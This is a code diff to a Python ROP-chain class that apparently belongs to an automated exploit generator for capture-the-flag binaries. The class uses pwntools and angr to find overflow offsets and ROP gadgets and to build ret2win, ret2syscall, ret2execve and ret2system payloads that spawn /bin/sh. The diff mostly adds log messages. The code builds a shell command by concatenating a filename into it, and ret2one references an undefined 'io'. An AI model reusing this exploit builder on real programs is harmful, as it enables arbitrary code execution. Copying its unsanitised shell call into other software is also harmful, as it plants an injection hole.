@@ -7,7 +7,8 @@ import os
 from Print import Print
 
 class ROP:
-    def __init__(self, analysis, v_lvl):
+    def __init__(self, analysis, v_lvl): 
+        self.fart_print = Print(v_lvl)
         self.analysis = analysis
         self.filename = analysis.binary
         self.v_lvl = v_lvl
@@ -16,7 +17,8 @@ class ROP:
         self.gadgets = []
         self.find_gadgets()
         self.libc = "/opt/libc.so.6"
-        self.fart_print = Print(v_lvl)
+
+        self.fart_print.info("Buffer overflow likely!")
 
     def write_binsh_to_mem(self):
         angr_proj = angr.Project(self.analysis.binary)
@@ -27,6 +29,7 @@ class ROP:
         return angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
     
     def build_exploit(self, failed=False):
+        self.fart_print.info("Attempting to discover the constraints to exploiting the buffer overflow")
         payload = None
         if self.analysis.has_win():
             if self.analysis.win_has_args():
@@ -54,7 +57,9 @@ class ROP:
         return payload
     
     def set_offset(self):
+        self.fart_print.info("Attempting to find the offset to control the instruction pointer")
         try:
+            # TODO: Fix this. It failed 100% of the time
             p = process(self.filename)
             p.sendline(cyclic(1024, n=8))
             p.wait()
@@ -63,9 +68,11 @@ class ROP:
             os.remove(core.file.name)
             return b'A'*cyclic_find(core.read(core.rsp, 8), n=8)
         except PwnlibException as e:
+            self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
             return Get2overflow(self.filename, self.v_lvl).buf()
 
     def ret2win(self, failed):
+        self.fart_print.info("Crafting payload for ret2win")
         payload = self.offset
         if failed:
             payload += self.realign()
@@ -74,6 +81,7 @@ class ROP:
         return payload
     
     def ret2win_with_args(self, failed):
+        self.fart_print.info("Crafting payload for ret2win with args")
         #TODO: Instead of passing address to win, return address to system or execve inside of win to avoid argument
         payload = self.offset
         payload += self.satisfy_win()
@@ -84,6 +92,7 @@ class ROP:
         return payload
 
     def ret2execve(self, failed):
+        self.fart_print.info("Crafting payload for ret2execve")
         payload = self.offset
         payload += self.generic_first_arg()
         payload += self.fill_reg("rsi", 0)
@@ -95,6 +104,7 @@ class ROP:
         return payload
 
     def ret2syscall(self, failed):
+        self.fart_print.info("Crafting payload for ret2syscall")
         payload = self.offset
         payload += self.fill_reg("rax", 59)
         payload += self.generic_first_arg()
@@ -107,6 +117,7 @@ class ROP:
         return payload
     
     def ret2system(self, failed):
+        self.fart_print.info("Crafting payload for ret2system")
         payload = self.offset
         payload += self.generic_first_arg() 
         payload += self.fill_reg("rsi", 0)
@@ -117,6 +128,7 @@ class ROP:
         return payload
 
     def ret2one(self, failed):
+        self.fart_print.info("Crafting payload for ret2one")
         payload = self.offset
         p = process(self.filename)
         given = int("0x"+io.recvuntil(b'>>>').decode('utf-8').split('0x')[1].split(' ')[0].strip('\n'),16)
@@ -126,6 +138,7 @@ class ROP:
         return payload
 
     def generic_first_arg(self):
+        self.fart_print.info("Setting up the first arg for ret2function")
         payload = b""
 
         if self.analysis.has_catflagtxt():
@@ -139,6 +152,7 @@ class ROP:
         return payload
 
     def find_gadgets(self):
+        self.fart_print.info("Finding ROP gadgets")
         cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | grep 0x"
         raw_gadgets = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
